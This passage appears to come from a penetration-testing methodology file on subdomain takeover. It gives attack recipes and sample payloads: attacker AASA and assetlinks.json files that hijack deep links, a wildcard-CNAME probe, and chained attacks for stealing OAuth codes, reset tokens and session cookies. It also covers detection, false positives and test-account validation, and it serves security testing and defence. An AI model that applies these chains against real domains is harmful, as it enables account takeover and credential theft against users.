**Primitive.** iOS Universal Links and Android App Links bind a mobile app's intent handling to a specific hostname through a `.well-known/apple-app-site-association` (AASA) file for iOS or `.well-known/assetlinks.json` for Android, served from that hostname over HTTPS. The OS fetches the file at app install (iOS) or on-demand (Android) and uses it to decide whether a tapped `https://sub.example.com/path` opens the app or the browser. A taken-over subdomain can publish an attacker-controlled AASA or assetlinks.json that associates the hostname with the attacker's app bundle ID (iOS) or a package name + SHA-256 fingerprint under the attacker's control (Android, where any dev can self-sign with any package name).

**Preconditions.** All of: (i) the parent app publishes AASA / assetlinks.json on a subdomain the attacker can take over; (ii) the OS has not cached the legitimate association (iOS caches per-install, invalidated on reinstall; Android caches per-boot and per-package-install); (iii) for Android, the attacker's app's SHA-256 fingerprint is listed in the published assetlinks.json; (iv) iOS Universal Links fetches the AASA over HTTPS with a valid DV cert — the attacker obtains one via ACME HTTP-01 after claim.

**Attack recipe.**

```json
# Served at https://sub.example.com/.well-known/apple-app-site-association
{
  "applinks": {
    "apps": [],
    "details": [
      {"appID": "<attacker-team-id>.com.attacker.app",
       "paths": ["*"]}
    ]
  }
}

# Served at https://sub.example.com/.well-known/assetlinks.json
[{
  "relation": ["delegate_permission/common.handle_all_urls"],
  "target": {
    "namespace": "android_app",
    "package_name": "com.attacker.app",
    "sha256_cert_fingerprints": ["<attacker-signing-cert-sha256>"]
  }
}]
```

iOS verifies the AASA via Apple's CDN proxy, which fetches directly from the hostname — a correctly-served valid file with the attacker's team ID associates the host with the attacker's app. On the next tap of a `https://sub.example.com/<anything>` link from Mail, Messages, or Safari, the OS opens the attacker's app and passes the full URL (including auth-callback codes, deep-link tokens, password-reset payloads) as the activation intent. Android resolves assetlinks.json with Google's Play-signed verifier for Play-installed apps; sideloaded apps and non-Play builds verify directly against the hostname, so the attacker's self-signed APK matching the published fingerprint claims the association.

**Confirmation signal.** On a test device: install the attacker's app, tap a `https://sub.example.com/x` link; the OS opens the attacker's app rather than the browser or the legitimate app. On iOS, `swcutil dl` (Simulator) or `swcutil verify -d sub.example.com` confirms the association. On Android, `adb shell dumpsys package domain-preferred-apps` lists the attacker's package as the verified handler for the hostname.

**Impact.** OAuth / SSO deep-link callbacks that redirect to `sub.example.com/oauth/callback?code=...` deliver authorization codes to the attacker's app; password-reset links that activate the legitimate app via Universal Link now activate the attacker's app with the reset token; magic-link authentication flows deliver the magic to the attacker. Full account-takeover primitive on any flow that uses deep-link callbacks on the taken-over host. Routes to `authentication_jwt.md § OAuth Deep-Link` for the post-interception token exchange and to `csrf.md` for session-establishment chains that assume the activating app is the legitimate one.

## Wildcard Dangling CNAME

**Primitive.** A wildcard CNAME record (`*.example.com CNAME <takeover-able provider>`) multiplies a single claim into an arbitrary namespace — the attacker mints trusted hostnames on demand (`login.example.com`, `sso.example.com`, `admin.example.com`) by requesting any label and serving content on the controlled provider.

**Preconditions.** All of: (i) a wildcard CNAME exists at the parent or subzone level; (ii) the pointed-at provider is in column V or E of the base's fingerprint table — the wildcard inherits the provider's claimability; (iii) the parent's defenses — CSP, OAuth redirect allowlist, CORS allowlist — are keyed on a pattern (`*.example.com`, regex matches) that the mint-on-demand hostname satisfies.

**Attack recipe.** Claim the pointed-at provider resource once; then serve content under any label the attacker needs for the specific chain. For a CSP allowlist of `*.example.com`, pick a plausible label (`cdn-assets.example.com`) and host the script there. For an OAuth client that allowlists any subdomain of `example.com`, register the IdP flow against `oauth-callback.example.com`. For phishing, pick `login.example.com` or `account.example.com`.

```bash
# Detect the wildcard dangling:
dig +short random-$(uuidgen).example.com    # resolves if a wildcard exists
# follow the CNAME to the provider endpoint; probe for the unclaimed-response fingerprint
```

**Confirmation signal.** A randomly-chosen label (one the org cannot have provisioned) resolves to the provider's unclaimed response, and claiming the pointed-at provider resource causes every label under the wildcard to serve attacker content. Validate by requesting two different arbitrary labels and confirming both serve the same payload.

**Impact.** Force-multiplied every chain in this file — one claim grants arbitrary trusted hostnames for CSP gadget, OAuth redirect, cookie pivot, SAML ACS, and CT-based brand trust. The practical highest-impact subdomain-takeover class in a modern web app; prioritize the hunt. Routes to every downstream primitive in this file.

## Chaining Surface

**Upstream primitives (what grants takeover):** `infrastructure_lifecycle` recon that surfaces decommissioned SaaS integrations, expired registrables, and the record-level dangling state; `reconnaissance/*` enumeration pipelines that produce the subdomain inventory and CT-log tracking; `agentic_system_security` where an LLM-driven asset manager was told to clean up DNS without validating the backing resource was actually destroyed.

**Downstream capabilities (what takeover grants):**

- `xss.md` — the CSP `script-src` gadget and the second-order subresource load primitives both resolve to parent-origin JavaScript execution.
- `csrf.md` — the SameSite-same-site bypass, and the credentialed-fetch angle after CORS trust escalation reads a per-request token.
- `authentication_jwt.md` — the OAuth code/SAML assertion delivery to a taken-over host, and the cookie-pivot path if the parent's session is a JWT the attacker can re-sign after reading.
- `open_redirect.md` — the controlled subdomain is a trusted origin for redirect allowlists that key on `*.example.com`.
- `oauth` / `authentication_jwt.md` — the SAML ACS delivery and the OIDC code interception are both account-takeover primitives.
- `ssrf.md` is NOT a direct downstream — a taken-over subdomain hosted on attacker infrastructure is not SSRF-reachable from the target's internal network unless the target itself makes an outbound request to the taken-over name (which is then the second-order subresource load primitive, not SSRF).

**Composite chains, routed by filename:**

1. **Wildcard-dangling → CSP gadget → stored XSS → full ATO.** Claim the wildcard-pointed provider (base's claim recipes); mint `cdn-assets.example.com` to satisfy the parent's `script-src *.example.com`; serve a script that exfiltrates the authenticated session cookie / per-request CSRF token; the primitive now routes to `xss.md § DOM Sinks` for the post-execution surface. One claim, parent-origin JS execution.

2. **MX takeover → password reset ATO → OAuth consent abuse.** Claim the MX via NS-delegation or decommissioned-mail-provider; receive the reset mail at the catch-all; redeem the reset; the account now authenticates via OAuth where the IdP trusts the ATO'd account to approve third-party scopes. Routes to `authentication_jwt.md` for token-step details.

3. **Second-order subresource → service-worker install → persistent MITM.** Claim a dangling CDN host that the parent still imports a service-worker script from; serve a service worker that intercepts all `fetch` on the parent origin; the install persists across page loads until manual unregistration. Highest-persistence class; routes to `xss.md` for exploitation and to `csrf.md` for authenticated-write forgery through the worker.

4. **Cloud IP reuse → OAuth redirect delivery → account takeover.** Cycle allocations to claim the exact A-record IP; stand up HTTPS with DV cert (via ACME HTTP-01 served from the claimed IP); the IdP redirects victim auth codes to the claimed host; routes to `authentication_jwt.md`.

5. **NS delegation takeover → wildcard DV cert → brand-level TLS trust.** Register the expired NS registrable; publish ACME DNS-01 TXT records for `*.sub.example.com`; obtain a wildcard DV cert; now the attacker is TLS-trusted for arbitrary labels under the delegated subzone with no further claim steps. Highest-reach class.

## Detection and Confirmation Methodology

The base covers the enumeration + fingerprint-and-attempt pipeline. The deep-tier additions are the chain-primitive confirmations and the leading-signal monitors:

- **Chain-ready confirmation** — a claim is a finding only after one chain primitive is proven to fire. The `curl` to the taken-over host returning attacker content is defacement-grade; the parent-origin JS execution via the CSP gadget is the P1/P2 finding. Report the chain primitive, not the claim.
- **CT-log monitoring as leading signal** — a cert whose renewal cadence falls behind schedule precedes a decommission by hours to days. certstream + per-zone filtering produces a hunt queue ranked by renewal lapse.
- **TLS cert mismatch** — a taken-over host where the attacker has issued a DV cert produces a CT-log entry under a different issuer / SAN pattern than the org's own cert pipeline. Monitor your own org's CT entries and alert on unexpected issuers for your zones.
- **Service-worker scope detection** — a parent-origin page that registers a service worker from a sibling subdomain (`navigator.serviceWorker.register('https://sw.example.com/sw.js')`) exposes the service-worker-install chain primitive if that subdomain dangles. Grep bundles for `serviceWorker.register(` and resolve the referenced host.
- **OAuth client inventory** — the IdP's registered-client allowlist is the authoritative source for which hostnames the OAuth-chain primitive applies to. Dump the client list and intersect with the subdomain inventory; a dangling host in the allowlist is a critical finding independent of whether a claim has been attempted.

## False-Positive Discipline

- **Provider-branded 404 ≠ claimable.** The fingerprint table marks V/E/N; column N providers (CloudFront, Fastly, Statuspage, HubSpot, Unbounce, UserVoice, Desk, Kinsta) enforce ownership before serving attacker content, so the unclaimed-serving body is a recon signal, not proof. Only a successful claim counts.
- **NXDOMAIN at the parent is not the primitive.** The dangling state is the CNAME *target* NXDOMAIN'ing or the provider returning unclaimed; a parent-level NXDOMAIN means the record is gone, which breaks the chain primitives (no record to resolve to the attacker). Confirm the CNAME chain terminates at a claimable provider, not at parent-level removal.
- **A record inside a provider range ≠ claimable.** The IP may still be allocated to the org and firewalled; verify provider-default serving before cycling allocations. False positives here waste budget and leave fingerprints at the provider's audit log.
- **CSP that *includes* the subdomain is not enough.** The chain also needs a sink that loads from the subdomain. A parent whose CSP allowlists `cdn.example.com` but has no `<script src="https://cdn.example.com/...">` in its HTML is a weaker finding than one that references the dangling host directly. Report both the allowlist and the referencing sink.
- **MX takeover with DMARC-reject on the mail domain.** If outbound mail from `sub.example.com` is DMARC-rejected, the inbound-receipt primitive still works, but services that send one-time tokens to the vulnerable domain may bounce if their outbound mail enforces DMARC alignment against the recipient-domain policy (uncommon but observed). Confirm receipt before reporting the ATO chain.

## Validation

- Reproduce the chain primitive against a controlled test account on the parent application (not against real users). Capture the HTTP responses demonstrating the primitive — the parent-origin script execution, the CORS-credentialed response, the OAuth code delivery.
- Preserve DNS-chain evidence before and after the claim (`dig +trace` output), TLS cert evidence (CT-log entry with issuer and SAN), and the chain-primitive evidence (dev-tools Network tab export, HTTP transcript). The claim is reproducible from the artifacts; the finding is reproducible from the chain.
- For NS-delegation takeover, do not leave the attacker-controlled nameservers live past the finding — unlike CNAME takeover (where another defender can re-claim), NS delegation grants persistent authority until the parent explicitly cleans up the delegation. Coordinate the fix with the record owner before closing the engagement.

## Summary

Takeover primitives are grading-only once a chain fires: the cookie pivot, CORS escalation, CSP gadget, OAuth code delivery, SameSite bypass, NS delegation, cloud-IP reuse, mail receipt, and second-order subresource load are the units of impact. The wildcard-dangling CNAME and NS-delegation primitives are force multipliers that convert one claim into an arbitrary namespace with wildcard DV-cert trust; the second-order subresource and service-worker-install primitives convert takeover into persistent XSS without touching the parent's input surface. Route by filename to the sibling that owns each downstream chain, and never report a claim without the chain primitive that fired.
